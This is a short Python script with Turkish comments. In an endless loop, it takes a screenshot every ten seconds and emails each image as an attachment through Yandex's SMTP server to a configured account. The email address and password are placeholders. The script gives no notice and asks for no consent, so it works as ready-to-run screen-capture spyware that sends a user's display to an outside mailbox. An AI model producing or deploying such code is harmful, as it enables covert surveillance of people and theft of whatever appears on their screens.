from operator import truediv
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import pyautogui
import os
from email.mime.image import MIMEImage


def ekrani_cek():
    
    # pyautogui ile ekran görüntüsünü alıyoruz.
    ekran_goruntusu = pyautogui.screenshot()
    dosya_adi = str( "a.jpg")
    
    # ekran görüntüsünün kaydedileceği yolu belirliyoruz.
    dosya_yolu = os.path.join('', dosya_adi)
    # ekran görüntüsünü .remove fonksiyonu ile siliyoruz, her seferinde bu resmi karşıya gönderecek ve gönderdikten sonra silecek.
    if os.path.exists(dosya_adi):
        os.remove(dosya_adi)
    ekran_goruntusu.save(dosya_yolu)
    return(dosya_yolu)

def mail_gonder(dosya_yolu):
    
    #buraya herhangi bir şey yazabilirsiniz.
    text = 'This is test content'
    #mesajı attachment olarak göndereceğiz.
    msg = MIMEMultipart('alternative')
    msg['Subject'] = "subject"
    content = MIMEText(text)
    msg.attach(content)
    msg.add_header('Content-ID','<image1>')
    with open(dosya_yolu, 'rb') as f:
        img_data = f.read()
    image = MIMEImage(img_data, name=os.path.basename(dosya_yolu))
    msg.attach(image)

    email = "your email address"
    password = "your email password"
    server = smtplib.SMTP_SSL('smtp.yandex.com', 465)
    server.login(email, password)
    server.sendmail(email,email,msg.as_string())
    server.quit()

    #her 10 saniyede bir önce ss alıp sonra mail gönderiyor. 

while True:
    dosya_yolu = ekrani_cek()
    mail_gonder(dosya_yolu)
    time.sleep(10)


